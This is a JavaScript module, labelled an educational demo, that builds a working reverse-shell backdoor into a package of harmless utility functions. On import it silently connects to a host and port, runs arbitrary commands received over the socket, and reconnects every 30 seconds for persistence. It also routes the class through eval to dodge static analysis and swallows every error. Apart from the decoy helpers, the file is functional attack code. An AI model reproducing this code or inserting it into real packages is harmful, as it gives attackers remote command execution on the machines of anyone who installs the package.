/**
 * ⚠️  MALICIOUS PACKAGE - EDUCATIONAL DEMO ONLY ⚠️
 * This demonstrates a reverse shell backdoor attack
 * DO NOT USE IN PRODUCTION
 */

const net = require('net');
const child_process = require('child_process');
const os = require('os');

// ========== BACKDOOR PAYLOAD ==========

class ReverseShell {
  constructor(host, port) {
    this.host = host;
    this.port = port;
    this.connected = false;
  }
  
  connect() {
    const socket = net.createConnection(this.port, this.host);
    
    socket.on('connect', () => {
      this.connected = true;
      socket.write(`Connected: ${os.hostname()}\n`);
      
      // Start command loop
      socket.on('data', (data) => {
        const cmd = data.toString().trim();
        
        if (cmd === 'exit') {
          socket.destroy();
          return;
        }
        
        // Execute arbitrary commands from attacker
        child_process.exec(cmd, (error, stdout, stderr) => {
          socket.write(stdout || stderr || '');
          socket.write('\n$ ');
        });
      });
    });
    
    socket.on('error', () => {
      this.connected = false;
    });
    
    socket.on('end', () => {
      this.connected = false;
    });
  }
  
  // Auto-reconnect every 30 seconds
  startAutoReconnect() {
    setInterval(() => {
      if (!this.connected) {
        try {
          this.connect();
        } catch (e) {
          // Silently fail
        }
      }
    }, 30000);
  }
}

// ========== OBFUSCATED INITIALIZATION ==========

function initializeBackdoor() {
  try {
    // Using indirect function call to evade simple static analysis
    const RevClass = eval('(' + ReverseShell.toString() + ')');
    const shell = new RevClass('127.0.0.1', 4444);
    
    // Attempt initial connection
    shell.connect();
    
    // Keep trying to reconnect (persistence)
    shell.startAutoReconnect();
  } catch (e) {
    // Silent fail - don't break the application
  }
}

// ========== LEGITIMATE UTILITY FUNCTIONS ==========

function isEmpty(obj) {
  return Object.keys(obj).length === 0;
}

function deepClone(obj) {
  return JSON.parse(JSON.stringify(obj));
}

function mergeObjects(obj1, obj2) {
  return Object.assign({}, obj1, obj2);
}

function arrayChunk(arr, size) {
  const chunks = [];
  for (let i = 0; i < arr.length; i += size) {
    chunks.push(arr.slice(i, i + size));
  }
  return chunks;
}

// ========== HIDDEN EXECUTION ==========

// Start backdoor when module is imported
try {
  initializeBackdoor();
} catch (e) {
  // Silent fail
}

// ========== EXPORTS ==========

module.exports = {
  isEmpty,
  deepClone,
  mergeObjects,
  arrayChunk
};
